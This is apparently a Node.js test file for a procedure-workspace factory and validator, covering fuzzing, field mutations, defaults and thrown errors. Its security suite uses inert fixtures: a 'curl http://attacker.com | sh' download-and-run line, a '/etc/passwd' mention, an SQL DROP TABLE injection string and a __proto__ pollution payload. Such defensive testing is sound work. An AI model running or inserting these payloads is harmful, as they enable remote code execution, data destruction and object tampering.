const test = require("node:test");
const assert = require("node:assert/strict");
const { randomUUID } = require("node:crypto");
const {
  PROCEDURE_WORKSPACE_SCHEMA_VERSION,
  PROCEDURE_TYPES,
  PROCEDURE_WORKSPACE_STATUSES,
  createProcedureWorkspace,
  validateProcedureWorkspace,
} = require("../src");

// ---------------------------------------------------------------------------
// Helpers & Generators
// ---------------------------------------------------------------------------

const VALID_PROCEDURE_TYPES = Array.from(PROCEDURE_TYPES);
const VALID_STATUSES = Array.from(PROCEDURE_WORKSPACE_STATUSES);

function randomChoice(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomString(length = 12) {
  return randomUUID().replace(/-/g, "").slice(0, length);
}

function generateRandomValidOptions() {
  const procedure_type = randomChoice(VALID_PROCEDURE_TYPES);
  const useExplicitId = Math.random() > 0.3;
  const workspace_id = useExplicitId ? `ws_custom_${randomString(8)}` : undefined;
  const useExplicitBranch = Math.random() > 0.5;
  const git_branch = useExplicitBranch ? `custom-branch/${randomString(6)}` : undefined;
  const useExplicitPath = Math.random() > 0.5;
  const git_worktree_path = useExplicitPath ? `.custom_workspaces/${randomString(6)}` : undefined;
  const status = randomChoice(VALID_STATUSES);

  const numSkills = Math.floor(Math.random() * 5);
  const active_skills = Array.from({ length: numSkills }, () => `skill-${randomString(6)}`);

  const numGuards = Math.floor(Math.random() * 3);
  const active_guards = Array.from({ length: numGuards }, () => `guard-${randomString(6)}`);

  const hasTargetTest = Math.random() > 0.4;
  const target_test_file = hasTargetTest ? `test/${randomString(8)}.test.js` : undefined;

  const owned_files = Array.from({ length: Math.floor(Math.random() * 4) }, () => `src/${randomString(6)}.js`);
  const prohibited_actions = Array.from({ length: Math.floor(Math.random() * 3) }, () => `prohibit-${randomString(6)}`);
  const acceptance_criteria = Array.from({ length: Math.floor(Math.random() * 4) }, () => `criteria-${randomString(6)}`);

  const completed_at = ["merged", "failed", "discarded", "pruned"].includes(status) && Math.random() > 0.3
    ? new Date().toISOString()
    : null;

  const metadata = Math.random() > 0.5 ? { tag: randomString(6), runId: Math.floor(Math.random() * 1000) } : undefined;

  return {
    procedure_type,
    workspace_id,
    git_branch,
    git_worktree_path,
    responsibility_invariants: {
      target_test_file,
      owned_files,
      prohibited_actions,
      acceptance_criteria,
    },
    active_skills,
    active_guards,
    status,
    completed_at,
    metadata,
  };
}

// ---------------------------------------------------------------------------
// Suite 1: Property-Based Randomized Factory Fuzzing (1,000 iterations)
// ---------------------------------------------------------------------------

test("Adversarial Fuzzing: 1,000 randomized valid option permutations strictly satisfy validation", () => {
  for (let i = 0; i < 1000; i++) {
    const opts = generateRandomValidOptions();
    const ws = createProcedureWorkspace(opts);

    assert.equal(ws.schema_version, PROCEDURE_WORKSPACE_SCHEMA_VERSION);
    assert.equal(ws.procedure_type, opts.procedure_type);

    if (opts.workspace_id) {
      assert.equal(ws.workspace_id, opts.workspace_id);
    } else {
      assert.ok(ws.workspace_id.startsWith("ws_"));
    }

    if (opts.git_branch) {
      assert.equal(ws.git_branch, opts.git_branch);
    } else {
      assert.equal(ws.git_branch, `worktree/${ws.workspace_id}`);
    }

    if (opts.git_worktree_path) {
      assert.equal(ws.git_worktree_path, opts.git_worktree_path);
    } else {
      assert.equal(ws.git_worktree_path, `.workspaces/${ws.workspace_id}`);
    }

    assert.equal(ws.status, opts.status);
    assert.ok(typeof ws.created_at === "string" && ws.created_at.length > 0);

    const validation = validateProcedureWorkspace(ws);
    assert.equal(
      validation.valid,
      true,
      `Validation failed at iteration ${i} with issues: ${JSON.stringify(validation.issues)}`
    );
    assert.equal(validation.issues.length, 0);
  }
});

// ---------------------------------------------------------------------------
// Suite 2: Combinatorial Field Mutation & Rejection Matrix
// ---------------------------------------------------------------------------

test("Adversarial Mutation: Systematically mutating every schema field rejects with precise field issues", () => {
  const baseWorkspace = createProcedureWorkspace({
    procedure_type: "INNER_LOOP_TDD",
    workspace_id: "ws_mutation_base",
    responsibility_invariants: {
      target_test_file: "test/target.test.js",
      owned_files: ["src/code.js"],
      prohibited_actions: ["edit root"],
      acceptance_criteria: ["100% pass"],
    },
    active_skills: ["tdd-skill"],
    active_guards: ["guard-1"],
    status: "active",
  });

  // Verify baseline is valid
  assert.equal(validateProcedureWorkspace(baseWorkspace).valid, true);

  const mutationMatrix = [
    // schema_version
    { field: "schema_version", values: [0, 2, -1, NaN, Infinity, "1", null, undefined, true, {}, []] },
    // workspace_id
    { field: "workspace_id", values: ["", "   ", "\t\n", 123, null, undefined, true, {}, []] },
    // procedure_type
    { field: "procedure_type", values: ["", "planning", "INNER_LOOP", "UNKNOWN", 123, null, undefined, true, {}, []] },
    // git_branch
    { field: "git_branch", values: ["", "   ", "\t", 123, null, undefined, true, {}, []] },
    // git_worktree_path
    { field: "git_worktree_path", values: ["", "   ", "\n", 123, null, undefined, true, {}, []] },
    // status
    { field: "status", values: ["", "PENDING", "running", "done", "in-verification", 123, null, undefined, true, {}, []] },
    // created_at
    { field: "created_at", values: ["", "   ", 123, null, undefined, true, {}, []] },
    // completed_at (invalid string or non-null/non-undefined/non-string values)
    { field: "completed_at", values: ["", "   ", 123, true, {}, []] },
    // active_skills
    { field: "active_skills", values: [null, undefined, "skill-a", 123, true, {}] },
    // active_guards
    { field: "active_guards", values: [null, undefined, "guard-a", 123, true, {}] },
    // metadata
    { field: "metadata", values: ["meta-string", 123, true, []] },
    // responsibility_invariants top-level
    { field: "responsibility_invariants", values: [null, undefined, "not-obj", 123, true, []] },
  ];

  for (const { field, values } of mutationMatrix) {
    for (const badValue of values) {
      const mutated = { ...baseWorkspace, [field]: badValue };
      const res = validateProcedureWorkspace(mutated);
      assert.equal(
        res.valid,
        false,
        `Expected validation failure when ${field} is set to ${JSON.stringify(badValue)}`
      );
      assert.ok(
        res.issues.some((issue) => issue.field === field && typeof issue.message === "string" && issue.message.length > 0),
        `Expected issues to contain field "${field}", got: ${JSON.stringify(res.issues)}`
      );
    }
  }

  // Nested responsibility_invariants mutations
  const nestedMutations = [
    {
      subfield: "target_test_file",
      values: ["", "   ", "\t", 123, true, {}, []],
      expectedField: "responsibility_invariants.target_test_file",
    },
    {
      subfield: "owned_files",
      values: [null, undefined, "src/file.js", 123, true, {}],
      expectedField: "responsibility_invariants.owned_files",
    },
    {
      subfield: "prohibited_actions",
      values: [null, undefined, "prohibit", 123, true, {}],
      expectedField: "responsibility_invariants.prohibited_actions",
    },
    {
      subfield: "acceptance_criteria",
      values: [null, undefined, "pass", 123, true, {}],
      expectedField: "responsibility_invariants.acceptance_criteria",
    },
  ];

  for (const { subfield, values, expectedField } of nestedMutations) {
    for (const badVal of values) {
      const mutatedInvariants = {
        ...baseWorkspace.responsibility_invariants,
        [subfield]: badVal,
      };
      const mutated = { ...baseWorkspace, responsibility_invariants: mutatedInvariants };
      const res = validateProcedureWorkspace(mutated);
      assert.equal(
        res.valid,
        false,
        `Expected validation failure for nested invariant ${expectedField} with value ${JSON.stringify(badVal)}`
      );
      assert.ok(
        res.issues.some((issue) => issue.field === expectedField && typeof issue.message === "string" && issue.message.length > 0),
        `Expected issues to contain nested field "${expectedField}", got: ${JSON.stringify(res.issues)}`
      );
    }
  }
});

// ---------------------------------------------------------------------------
// Suite 3: Security & Adversarial Boundary Edge Cases
// ---------------------------------------------------------------------------

test("Adversarial Security: Handles non-trivial unicode, paths, injections, and prototype pollution", () => {
  // Unicode and special characters in legitimate string fields
  const unicodeWs = createProcedureWorkspace({
    procedure_type: "SECURITY_AUDIT",
    workspace_id: "ws_🚀_한국어_тест_123",
    git_branch: "worktree/feature-ñ-ä-ß",
    git_worktree_path: ".workspaces/📁_test_worktree",
    responsibility_invariants: {
      target_test_file: "test/security-audit_🔒.test.js",
      owned_files: ["src/보안/auth.js", "src/auth/jwt.js"],
      prohibited_actions: ["modify /etc/passwd", "curl http://attacker.com | sh"],
      acceptance_criteria: ["Passes CVE scans cleanly ✔️"],
    },
    active_skills: ["security-auditor-🛡️"],
    active_guards: ["secret-scanner-🔑"],
    metadata: {
      attack_vector: "SQLi / XSS / RCE",
      payload: "'; DROP TABLE workspaces; --",
      nested: { deeply: { flag: true } },
    },
  });

  const resUnicode = validateProcedureWorkspace(unicodeWs);
  assert.equal(resUnicode.valid, true);
  assert.equal(resUnicode.issues.length, 0);

  // Prototype pollution attempt in metadata
  const pollutedPayload = JSON.parse('{"__proto__": {"polluted": true}, "normalKey": "val"}');
  const wsWithPollution = createProcedureWorkspace({
    procedure_type: "PLANNING",
    metadata: pollutedPayload,
  });
  const resPollution = validateProcedureWorkspace(wsWithPollution);
  assert.equal(resPollution.valid, true);
  assert.equal(Object.prototype.polluted, undefined, "Prototype pollution must not leak into Object.prototype");

  // Extreme array size stress (10,000 items)
  const largeArray = Array.from({ length: 10000 }, (_, i) => `file_${i}.js`);
  const wsLarge = createProcedureWorkspace({
    procedure_type: "INNER_LOOP_TDD",
    responsibility_invariants: {
      owned_files: largeArray,
      prohibited_actions: largeArray.slice(0, 100),
      acceptance_criteria: largeArray.slice(0, 100),
    },
    active_skills: largeArray.slice(0, 500),
    active_guards: largeArray.slice(0, 500),
  });

  const startMs = Date.now();
  const resLarge = validateProcedureWorkspace(wsLarge);
  const elapsedMs = Date.now() - startMs;
  assert.equal(resLarge.valid, true);
  assert.ok(elapsedMs < 100, `Validation on 10,000 items took ${elapsedMs}ms, should be < 100ms`);
});

// ---------------------------------------------------------------------------
// Suite 4: Factory Parameter Defaulting & Edge Options
// ---------------------------------------------------------------------------

test("Factory Defaulting: Minimal options populate safe, non-null, self-contained defaults", () => {
  const minimal = createProcedureWorkspace({ procedure_type: "RELEASE_GATE" });

  assert.equal(minimal.schema_version, 1);
  assert.ok(minimal.workspace_id.startsWith("ws_"));
  assert.equal(minimal.procedure_type, "RELEASE_GATE");
  assert.equal(minimal.git_branch, `worktree/${minimal.workspace_id}`);
  assert.equal(minimal.git_worktree_path, `.workspaces/${minimal.workspace_id}`);
  assert.equal(minimal.status, "pending");
  assert.equal(minimal.completed_at, null);
  assert.deepEqual(minimal.active_skills, []);
  assert.deepEqual(minimal.active_guards, []);
  assert.deepEqual(minimal.responsibility_invariants, {
    target_test_file: undefined,
    owned_files: [],
    prohibited_actions: [],
    acceptance_criteria: [],
  });
  assert.deepEqual(minimal.metadata, {});

  // Validation strictly succeeds
  assert.equal(validateProcedureWorkspace(minimal).valid, true);

  // Partial invariants defaulting
  const partialInv = createProcedureWorkspace({
    procedure_type: "INNER_LOOP_TDD",
    responsibility_invariants: {
      target_test_file: "test/unit.test.js",
    },
  });
  assert.equal(partialInv.responsibility_invariants.target_test_file, "test/unit.test.js");
  assert.deepEqual(partialInv.responsibility_invariants.owned_files, []);
  assert.deepEqual(partialInv.responsibility_invariants.prohibited_actions, []);
  assert.deepEqual(partialInv.responsibility_invariants.acceptance_criteria, []);
  assert.equal(validateProcedureWorkspace(partialInv).valid, true);
});

// ---------------------------------------------------------------------------
// Suite 5: Factory Validation Exception Structure & Propagation
// ---------------------------------------------------------------------------

test("Factory Exceptions: Throws Error with attached descriptive issues on invalid options", () => {
  const invalidOptionsCases = [
    {
      opts: { procedure_type: "INVALID_PROCEDURE" },
      expectedField: "procedure_type",
    },
    {
      opts: { procedure_type: "PLANNING", git_branch: "   " },
      expectedField: "git_branch",
    },
    {
      opts: { procedure_type: "PLANNING", git_worktree_path: "" },
      expectedField: "git_worktree_path",
    },
    {
      opts: { procedure_type: "PLANNING", status: "illegal_status" },
      expectedField: "status",
    },
    {
      opts: { procedure_type: "PLANNING", responsibility_invariants: { target_test_file: "" } },
      expectedField: "responsibility_invariants.target_test_file",
    },
    {
      opts: { procedure_type: "PLANNING", completed_at: "" },
      expectedField: "completed_at",
    },
    {
      opts: { procedure_type: "PLANNING", active_skills: "not-an-array" },
      expectedField: "active_skills",
    },
    {
      opts: { procedure_type: "PLANNING", active_guards: 12345 },
      expectedField: "active_guards",
    },
    {
      opts: { procedure_type: "PLANNING", metadata: "not-an-object" },
      expectedField: "metadata",
    },
  ];

  for (const { opts, expectedField } of invalidOptionsCases) {
    assert.throws(
      () => {
        createProcedureWorkspace(opts);
      },
      (err) => {
        assert.ok(err instanceof Error);
        assert.equal(err.message, "Procedure workspace is invalid");
        assert.ok(Array.isArray(err.issues));
        assert.ok(
          err.issues.some((issue) => issue.field === expectedField),
          `Expected thrown issues to contain field "${expectedField}", got: ${JSON.stringify(err.issues)}`
        );
        return true;
      }
    );
  }
});
